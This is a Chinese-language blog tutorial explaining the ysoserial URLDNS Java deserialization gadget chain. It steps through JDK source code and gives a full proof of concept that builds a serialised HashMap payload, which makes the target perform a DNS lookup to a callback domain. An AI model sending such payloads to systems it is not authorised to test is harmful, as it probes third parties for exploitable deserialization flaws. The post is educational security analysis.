---
title: javasec-urldns链
date: 2024-08-03T15:51:23+08:00
lastmod: 2025-09-29T20:53:14
tags:
  - sec
toc: "true"
---
# urldns链
URLDNS 是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。 

虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时使⽤
- 使⽤Java内置的类构造，对第三⽅库没有依赖,因此对java版本没有限制
- 在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞

## 前置知识

### gadget
Java反序列化漏洞产生漏洞的形式大致有两种,

- 一种是上下文入口类的readObject方法中直接包含了危险操作(危险函数)且传入危险函数的参数可控(这种情况很少)
- 还有一种情况就是入口类的readObject方法中间接调用了其它类(B类),在B类中又调用了恶意的方法或调用了其它包含恶意方法的类,这种链式触发命令执行的结构被称为反序列化利用链,组成这种链式结构中的"成员类"被称为Gadget而这种链式结构被称为Gadget Chain,通过构造Gadget Chain可以进行反序列化攻击。

## 漏洞分析
ysoserial里是这样生成payload的
```java
public Object getObject(final String url) throws Exception {
             //Avoid DNS resolution during payload creation
             //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
             URLStreamHandler handler = new SilentURLStreamHandler();

             HashMap ht = new HashMap(); // HashMap that will contain the URL
             URL u = new URL(null, url, handler); // URL to use as the Key
             ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

             Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

             return ht;
     }
     
     static class SilentURLStreamHandler extends URLStreamHandler {
     protected URLConnection openConnection(URL u) throws IOException {
         return null;
     }
     protected synchronized InetAddress getHostAddress(URL u) {
         return null;
     }
 }
```
利用链
```
Gadget Chain:
  HashMap.readObject()
    HashMap.putVal()
      HashMap.hash()
        URL.hashCode()
```
urldns是yso中较为简单的一个gadget，所以这里可以直接通过正向分析的方式进行分析

看到 URLDNS 类的 getObject ⽅法，ysoserial会调⽤这个⽅法获得Payload。这个⽅法返回的是⼀个对象，这个对象就是最后将被序列化的对象，在这⾥是 HashMap。因为触发反序列化的⽅法是 readObject,那么可以直奔 HashMap 类的 readObject ⽅法：

HashMap#readObject
```java
private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException {
        // Read in the threshold (ignored), loadfactor, and any hidden stuff
        s.defaultReadObject();
        reinitialize();
        if (loadFactor <= 0 || Float.isNaN(loadFactor))
            throw new InvalidObjectException("Illegal load factor: " +
                                             loadFactor);
        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0)
            throw new InvalidObjectException("Illegal mappings count: " +
                                             mappings);
        else if (mappings > 0) { // (if zero, use defaults)
            // Size the table using given load factor only if within
            // range of 0.25...4.0
            float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
            float fc = (float)mappings / lf + 1.0f;
            int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (fc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)fc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);
            @SuppressWarnings({"rawtypes","unchecked"})
                Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
```
putVal这一段，这里调用了hash方法来处理key，跟进hash方法：
```java
static final int hash(Object key) {
       int h;
       return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
   }
```
这里又调用了key.hashCode方法,这里的key是一个URL对象,让我们看看URL的hashCode方法：

URL#hashCode：
```java
public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
```
在URL类的hashCode方法中，又调用了URLStreamHandler#hashCode，并将自身传递进去：

URLStreamHandler#hashCode
```java
protected int hashCode(URL u) {
        int h = 0;

        // Generate the protocol part.
        String protocol = u.getProtocol();
        if (protocol != null)
            h += protocol.hashCode();

        // Generate the host part.
        InetAddress addr = getHostAddress(u);
```
getHostAddress，正是这步触发了dns请求：
```java
protected synchronized InetAddress getHostAddress(URL u) {

    if (u.hostAddress != null) {
        return u.hostAddress;
    }
    String host = u.getHost();
    if (host == null || host.equals("")) {
        return null;
    } else {
        try {
            u.hostAddress = InetAddress.getByName(host);
        } catch (UnknownHostException ex) {
            return null;
        } catch (SecurityException se) {
            return null;
        }
    }
    return u.hostAddress;
}
```
这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次 DNS查询。

可以理解为,在序列化 HashMap 类的对象时, 为了减小序列化后的大小, 并没有将整个哈希表保存进去, 而是仅仅保存了所有内部存储的 key 和 value. 所以在反序列化时, 需要重新计算所有 key 的 hash, 然后与 value 一起放入哈希表中. 而恰好, URL这个对象计算 hash 的过程中用了 getHostAddress 查询了 URL 的主机地址, 自然需要发出 DNS 请求.

这里存在一个问题,当我们生成payload的时候,也会存在计算哈希的过程,我们需要避免这个操作,

回到第一步：HashMap#readObject

key是使用readObject取出来的，也就是说在writeObject一定会写入key
```java
private void writeObject(java.io.ObjectOutputStream s)
        throws IOException {
        int buckets = capacity();
        // Write out the threshold, loadfactor, and any hidden stuff
        s.defaultWriteObject();
        s.writeInt(buckets);
        s.writeInt(size);
        internalWriteEntries(s);
    }
```
跟入internalWriteEntries
```java
void internalWriteEntries(java.io.ObjectOutputStream s) throws IOException {
        Node<K,V>[] tab;
        if (size > 0 && (tab = table) != null) {
            for (int i = 0; i < tab.length; ++i) {
                for (Node<K,V> e = tab[i]; e != null; e = e.next) {
                    s.writeObject(e.key);
                    s.writeObject(e.value);
                }
            }
        }
    }
```
这里的key以及value是从tab中取的，而tab的值即HashMap中table的值。

此时我们如果想要修改table的值，就需要调用HashMap#put方法，而HashMap#put方法中也会对key调用一次hash方法，所以在这里就会产生第一次dns查询
```java
    public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }
```
即
```java
import java.util.HashMap;
import java.net.URL;

public class Test {

    public static void main(String[] args) throws Exception {
        HashMap map = new HashMap();
        URL url = new URL("http://xrgsnqezso.yutu.eu.org");
        map.put(url,123); //此时会产生dns查询
    }
```
只想判断payload在对方机器上是否成功触发，那就应该避免掉这一次dns查询以及多余的操作，回到URL#hashCode：
```java
public synchronized int hashCode() {
      if (hashCode != -1)
          return hashCode;

      hashCode = handler.hashCode(this);
      return hashCode;
  }
```
这里会先判断hashCode是否为-1，如果不为-1则直接返回hashCode，也就是说我们只要在put前修改URL的hashCode为其他任意值，就可以在put时不触发dns查询。(hashCode默认值为-1)
![](https://img.l1uyun.one/javasec-urldns链_image_1.png)
这里的hashCode是private修饰的，所以我们需要通过反射来修改其值
```java
    public static void main(String[] args) throws Exception {
        HashMap map = new HashMap();
        URL url = new URL("http://xrgsnqezso.yutu.eu.org");
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true); //修改访问权限
        f.set(url,123); //设置hashCode值为123，这里可以是任何不为-1的数字
        System.out.println(url.hashCode()); // 获取hashCode的值，验证是否修改成功
        map.put(url,123); //调用map.put 此时将不会再触发dns查询
    }
```
此时输出url的hashCode为123，证明修改成功。
	![](https://img.l1uyun.one/javasec-urldns链_image_2.png)
当put完毕之后再将url的hashCode修改为-1，确保在反序列化调用hashCode方法时能够正常进行，下面是完整的POC
```java
#URLDNS.java

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;
public class URLDNS {
    public static void main(String[] args) throws Exception {
        HashMap<URL, String> hashMap = new HashMap<URL, String>();
        URL url = new URL("http://xxxx.xxx.xxx");
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, 0xdeadbeef); // 设一个值, 这样 put 的时候就不会去查询 DNS
        hashMap.put(url, "rmb122");
        f.set(url, -1); // hashCode 这个属性不是 transient 的, 所以放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
        oos.writeObject(hashMap);
    }
}

#Test.java
import java.io.FileInputStream;
import java.io.ObjectInputStream;
public class Test {
    public static void main(String[] args) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("out.bin"));
        ois.readObject();
    }
}
```

回过头来看看yso的payload

yso在创建URL对象时使用了三个参数的构造方法。yso用了子类继承父类的方式规避了dns查询的风险，其创建了一个内部类：
```java
static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
```
定义了一个URLConnection和getHostAddress方法，当调用put方法走到getHostAddress方法后，会调用SilentURLStreamHandler的getHostAddress而非URLStreamHandler的getHostAddress，这里直接return null了，所以自然也就不会产生dns查询。

## 参考
[urldns | Hack the world](https://d0gekong.github.io/2022/07/13/Java/UrlDNS/)

[xz.aliyun.com/t/13060](https://xz.aliyun.com/t/13060)
